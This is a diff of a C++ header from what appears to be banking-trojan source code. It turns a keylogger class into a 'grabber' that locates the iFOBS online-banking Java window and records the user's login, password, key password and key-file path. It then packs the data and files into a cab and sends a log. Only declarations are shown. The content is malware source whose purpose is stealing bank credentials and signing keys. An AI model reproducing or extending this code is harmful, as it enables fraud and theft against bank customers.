@@ -10,7 +10,9 @@
 #define IfobsOnlineH
 //---------------------------------------------------------------------------
 
+#include "JavaAppletGrabbers.h"
 #include "KeyLogger.h"
+#include "BotClasses.h"
 
 
 #define IFOBS_MAX_KEY_PATH_SIZE  3145728   /* Макс 3 мегабайта */
@@ -19,30 +21,48 @@
 namespace IfobsOnline
 {
 	// Функция активирует грабер IfobsOnline
-    bool Initialize();
+	bool Initialize(HWND JafaFrameWnd, const char* URL);
 }
 
 
 
-
-class TIfobsOnline : public TKeyLogger
+//******************************************************
+//  Класс идентификации Ифобс банка по схеме окон
+//******************************************************
+class TIfobsOnlineGrabber : public TBotObject
 {
 private:
+	HWND FSunAwtFrameWnd;
+	TBotList FEdits; // Список едитов
+
+	HWND LoginWnd;
+	HWND PasswordWnd;
+	HWND KeyPasswordWnd;
+	HWND KeyPathWnd;
+	DWORD Captions;  // Флаги найденых подписей
+
 	string FLogin;
 	string FPassword;
 	string FKeyPassword;
 	string FKeyFilePath;
 
-	string PackData();
-	void AddFilesToCab(LPVOID Cab);
-	void AddWndData(HWND Wnd);
-	bool BindData();
+	bool FIsIfobs;
 
-	friend BOOL CALLBACK IfobsOnlineEnumWndProc(HWND Wnd, LPARAM Data);
+	void   CheckWindow(HWND Wnd);
+	void   InsertWnd(HWND Wnd, TBotList &L);
+	bool   CheckScheme();
+	HWND   GetEditByID(LONG ID);
+	string PackTextData();
+	void   AddFilesToCab(LPVOID Cab);
+
+	friend int CALLBACK TIfobsOnlineGrabberEnumWnd(HWND Wnd, LPARAM Param);
 public:
-	TIfobsOnline();
-	~TIfobsOnline() {};
-	void SendLog();
+	TIfobsOnlineGrabber(HWND SunAwtFrameWnd);
+	~TIfobsOnlineGrabber() {};
+
+	bool inline IsIfobs() { return FIsIfobs; };
+
+	BOOL SendLog();
 };
 
 
